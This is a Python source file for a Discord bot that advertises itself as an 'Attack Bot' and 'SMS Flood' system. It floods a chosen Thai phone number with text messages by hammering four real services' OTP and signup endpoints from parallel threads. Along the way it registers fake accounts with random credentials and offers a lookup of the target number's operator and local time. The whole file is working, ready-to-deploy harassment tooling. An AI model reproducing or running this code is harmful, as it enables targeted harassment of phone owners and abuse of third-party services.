from datetime import datetime
from json import load, loads
from random import choice, randint
from re import search
from string import ascii_lowercase, digits
from threading import Thread
from discord import Embed, Intents, Streaming
from discord.ext import commands
from discord.ext.commands import Bot
from requests import Session

class Random:
    def string(chars = ascii_lowercase + digits, n=10):
        return ''.join(choice(chars) for _ in range(n))

    def integer(n):
        return str(randint(10**(n-1), (10**n)-1))

    def CardNumber():
        return search(
            """<td height="50" align="center" valign="top"><input name="sample-citizen-id" type="text" id="sample-citizen-id" value="(.*)" o""", 
            Session().get("http://www.kzynet.com/tools/thai_citizen_id_generator/").text).group(1)
    
    def Register():
        email = f"{Random.string(n=randint(1, 6))}{Random.integer(randint(1, 5))}@gmail.com"
        password = f"{Random.string(n=randint(4, 6))}{Random.integer(randint(3, 6))}"
        return {"email": email, "password": password}

class SMSService:
    METHOD = ['I.C.C', 'SET-Member', 'SCG-ID', 'NXSMS']

    def ICC(PHONE, amount): #I.C.C
        amount = amount//5
        for i in range(int(amount)):
            try:
                Session().post("https://us-central1-otp-service-icc.cloudfunctions.net/getotp", headers={ 
                    "Content-Type": "application/json"
                    }, json={"mobile_phone": PHONE,"type":"HISHER"})
            except:
                pass

    def SET_Member(PHONE, amount):
        amount = amount//5
        for i in range(int(amount)):
            try:
                session = Session() #SET-Member
                Ref = loads(session.post("https://api.set.or.th/api/member/registration",headers={
                    "content-type": "application/json"
                    }, json={
                        "citizenId":None,
                        "passport":"",
                        "country":"th",
                        "termFlag":True,
                        "subscriptionFlag":True,
                        "email": Random.Register()['email'],
                        "password": Random.Register()['password'],
                        "gender":"M",
                        "firstName":"เซอรร์รอส",
                        "lastName":"เซอรร์รอส",
                        "mobile":f"+66{PHONE[1:]}"}).text)['userRef']
                session.post("https://api.set.or.th/api/otp/request",headers={
                    "content-type": "application/json"
                    }, json={
                        "type":"REGISTRATION",
                        "refID":int(Ref),
                        "channel":"MOBILE"})
            except:
                pass

    def SCG_ID(PHONE, amount): #SCG-ID
        amount = amount//5
        for i in range(int(amount)):
            try:
                Session().post("https://api.scg-id.com/api/otp/send_otp", headers={
                    "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": PHONE})
            except:
                pass

    def NXSMS(PHONE, amount): #NXSMS
        amount = amount//5
        for i in range(int(amount)):
            try:
                Session().post("https://play.okdbet.com/api/signup/send-sms",headers={
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-OCTOBER-REQUEST-HANDLER": "onSendOtp"
                    },data=f"phone={PHONE}")
            except:
                pass

class Bot:
    with open("settings.json") as Loads:
        IMPORT = load(Loads)
    Client = Bot(
        command_prefix=IMPORT['prefix'], 
        intents=Intents.default())
    Client.remove_command("help")

    def run():
        Bot.Client.run(Bot.IMPORT['token'])

@Bot.Client.event
async def on_connect():
    print(f"LOGIN BOT NAME: {Bot.Client.user.name}#{Bot.Client.user.discriminator}")
    stream = Streaming(
        name=Bot.IMPORT['stream-status'],
        url="https://www.twitch.tv/monstercat", 
    )
    await Bot.Client.change_presence(activity=stream)

@Bot.Client.event
async def on_command_error(ctx, errors):
    error = getattr(errors, 'original', errors)
    if isinstance(error, commands.CommandNotFound): 
        em = Embed(colour=0xf44a4a, description=f"The command you are requesting could not be found\nPlease type the command `{Bot.IMPORT['prefix']}help` to see the command", timestamp=datetime.now())
        em.set_author(
            name=f'Flood System | An Error Has Occurred',
            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
        em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
        em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
        await ctx.send(embed=em)
    else: 
        pass

@Bot.Client.command()
async def help(ctx):
    try:
        if ctx.guild != None:
            em = Embed(colour=0xf44a4a, description=f"Commands for attacking \n:white_small_square: `{Bot.IMPORT['prefix']}flood [method] [phone] [amount]`\nOther commands \n:white_small_square: `{Bot.IMPORT['prefix']}method` To See all Methods \n:white_small_square: `{Bot.IMPORT['prefix']}phone [phone]` To Check Phone Number \n\n:white_small_square: The Owner of The Bot is: {Bot.IMPORT['credit']}\n:white_small_square: The Bot Developer is: TheNiceDayX#0001\n:white_small_square: All API available: {len(SMSService.METHOD)} API ", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | Help Page',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_thumbnail(url="https://emoji.gg/assets/emoji/9461-systemmessageuser.png?t=1627199975")
            em.set_footer(text="Attack Bot Version: 0.1 #Beta", icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
        else:
            em = Embed(colour=0xf44a4a, description=f"Please use the commands in The Server\nOr Contact : {Bot.IMPORT['credit']}", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | An Error Has Occurred',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
            em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
    except:
        pass

@Bot.Client.command()
async def phone(ctx, phone=None):
    if ctx.guild != None:
        if phone == None or "0" not in phone or len(phone) != 10:
            em = Embed(colour=0xf44a4a, description=f"You are using the wrong command or something is missing\nPlease type the command `{Bot.IMPORT['prefix']}help` to see the command again", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | An Error Has Occurred',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
            em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
        else:
            key = search("""<input type="hidden" name="key" value="(.*)"/>""", Session().get("https://phonenum.info/en/phone/").text).group(1)
            get = Session().post("https://phonenum.info/en/phone/", headers={
                "content-type": "application/x-www-form-urlencoded"
            }, data=f"phonenum=%2B66+{phone[1:]}&key={key}").text
            try:
                lang = search("""<a class="link_for_country_name" href="/en/country-code/66-thailand">(.*)</a></span >""", get).group(1)
            except:
                lang = "None"
            try:
                oper = search("""Operator: (.*) <br />""", get).group(1)
            except:
                oper = "None"
            try:
                zone = search("""<span class="abcCode">(.*)</span>""", get).group(1)
            except:
                zone = "None"
            try:
                time = search("""<span class="paramValue"><span class="time_zone_time">(.*)</span></span>""", get).group(1)
            except:
                time = "None"
            em = Embed(colour=0xf44a4a, description=f"Country: `{lang}`\nOperator: `{oper}`\nLocal Time: `{zone}:{time}`\n\n:white_small_square: This information may not be accurate", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | Mobile Phone Number Info',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_footer(text=phone, icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
    else:
        em = Embed(colour=0xf44a4a, description=f"Please use the commands in The Server\nOr Contact : {Bot.IMPORT['credit']}", timestamp=datetime.now())
        em.set_author(
            name=f'Flood System | An Error Has Occurred',
            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
        em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
        em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
        await ctx.send(embed=em)

@Bot.Client.command()
async def flood(ctx, api=None, phone=None, amount=None):
    if ctx.guild != None:
        if api == None or phone == None or amount == None or "0" not in phone or len(phone) != 10:
            em = Embed(colour=0xf44a4a, description=f"You are using the wrong command or something is missing\nPlease type the command `{Bot.IMPORT['prefix']}help` to see the command again", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | An Error Has Occurred',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
            em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
        else:
            if int(amount) < 5 or int(amount) > int(Bot.IMPORT['rate-limit']):
                em = Embed(colour=0xf44a4a, description=f"Please enter the correct number of times\n\nIn other words, the prohibition number is less than `5`\nor the prohibition is greater than `{Bot.IMPORT['rate-limit']}`", timestamp=datetime.now())
                em.set_author(
                    name=f'Flood System | An Error Has Occurred',
                    icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
                em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
                await ctx.send(embed=em)
            else:
                if phone in Bot.IMPORT['black-list']:
                    em = Embed(colour=0xf44a4a, description=f":white_small_square: Blacklisted numberds: `{phone}`\n\n:white_small_square:Please Use the Command with a different number\n:white_small_square: or Contact the Administrator", timestamp=datetime.now())
                    em.set_author(
                        name=f'Flood System | Blacklist System',
                        icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                    em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
                    em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
                    await ctx.send(embed=em)
                else:
                    if api == "1":
                        em = Embed(colour=0xf44a4a, timestamp=datetime.now())
                        em.set_author(
                            name=f'SMS Flood | Is Attacking',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.add_field(name="Mobile Number Attack Status", value=f"Attack number: `{phone}`\nSelected Method: `I.C.C`\n\n:white_small_square:  SMS has been sent to the \n:white_small_square: target number successfully")
                        em.set_footer(text="ATTACKING", icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
                        for _ in range(5):
                            Thread(target=SMSService.ICC, args=(phone, int(amount,))).start()
                    elif api == "2":
                        em = Embed(colour=0xf44a4a, timestamp=datetime.now())
                        em.set_author(
                            name=f'SMS Flood | Is Attacking',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.add_field(name="Mobile Number Attack Status", value=f"Attack number: `{phone}`\nSelected Method: `SET-Member`\n\n:white_small_square:  SMS has been sent to the \n:white_small_square: target number successfully")
                        em.set_footer(text="ATTACKING", icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
                        for _ in range(5):
                            Thread(target=SMSService.SET_Member, args=(phone, int(amount,))).start()
                    elif api == "3":
                        em = Embed(colour=0xf44a4a, timestamp=datetime.now())
                        em.set_author(
                            name=f'SMS Flood | Is Attacking',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.add_field(name="Mobile Number Attack Status", value=f"Attack number: `{phone}`\nSelected Method: `SCG-ID`\n\n:white_small_square:  SMS has been sent to the \n:white_small_square: target number successfully")
                        em.set_footer(text="ATTACKING", icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
                        for _ in range(5):
                            Thread(target=SMSService.SCG_ID, args=(phone, int(amount,))).start()
                    elif api == "4":
                        em = Embed(colour=0xf44a4a, timestamp=datetime.now())
                        em.set_author(
                            name=f'SMS Flood | Is Attacking',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.add_field(name="Mobile Number Attack Status", value=f"Attack number: `{phone}`\nSelected Method: `NXSMS`\n\n:white_small_square:  SMS has been sent to the \n:white_small_square: target number successfully")
                        em.set_footer(text="ATTACKING", icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
                        for _ in range(5):
                            Thread(target=SMSService.NXSMS, args=(phone, int(amount,))).start()
                    elif api == "5":
                        em = Embed(colour=0xf44a4a, timestamp=datetime.now())
                        em.set_author(
                            name=f'SMS Flood | Is Attacking',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.add_field(name="Mobile Number Attack Status", value=f"Attack number: `{phone}`\nSelected Method: `All Methods`\n\n:white_small_square:  SMS has been sent to the \n:white_small_square: target number successfully")
                        em.set_footer(text="ATTACKING", icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
                        for i in range(5):
                            Thread(target=SMSService.ICC, args=(phone, int(amount,))).start()
                            Thread(target=SMSService.SET_Member, args=(phone, int(amount,))).start()
                            Thread(target=SMSService.SCG_ID, args=(phone, int(amount,))).start()
                            Thread(target=SMSService.NXSMS, args=(phone, int(amount,))).start()
                    else:
                        em = Embed(colour=0xf44a4a, description=f"You are using the wrong command or something is missing\nPlease type the command `{Bot.IMPORT['prefix']}help` to see the command again", timestamp=datetime.now())
                        em.set_author(
                            name=f'Flood System | An Error Has Occurred',
                            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
                        em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
                        em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
                        await ctx.send(embed=em)
    else:
        em = Embed(colour=0xf44a4a, description=f"Please use the commands in The Server\nOr Contact : {Bot.IMPORT['credit']}", timestamp=datetime.now())
        em.set_author(
            name=f'Flood System | An Error Has Occurred',
            icon_url='https://emoji.gg/assets/emoji/9404-message.png')
        em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
        em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
        await ctx.send(embed=em)

@Bot.Client.command()
async def method(ctx):
    try:
        if ctx.guild != None:
            em = Embed(colour=0xf44a4a, timestamp=datetime.now())
            em.set_author(
                name="SMS Flood | Method Page",
                icon_url="https://emoji.gg/assets/emoji/9404-message.png")
            em.add_field(name="Please Select A Method Number", value=":white_small_square: Method [1]: `I.C.C`\n:white_small_square: Method [2]: `SET-Member`\n:white_small_square: Method [3]: `SCG-ID`\n:white_small_square: Method [4]: `NXSMS`\n:white_small_square: Method [5]: `All Methods`")
            em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
        else:
            em = Embed(colour=0xf44a4a, description=f"Please use the commands in The Server\nOr Contact : {Bot.IMPORT['credit']}", timestamp=datetime.now())
            em.set_author(
                name=f'Flood System | An Error Has Occurred',
                icon_url='https://emoji.gg/assets/emoji/9404-message.png')
            em.set_thumbnail(url="https://emoji.gg/assets/emoji/6764_no.gif")
            em.set_footer(text=Bot.IMPORT['footer'], icon_url=ctx.author.avatar_url)
            await ctx.send(embed=em)
    except:
        pass

Bot.run()
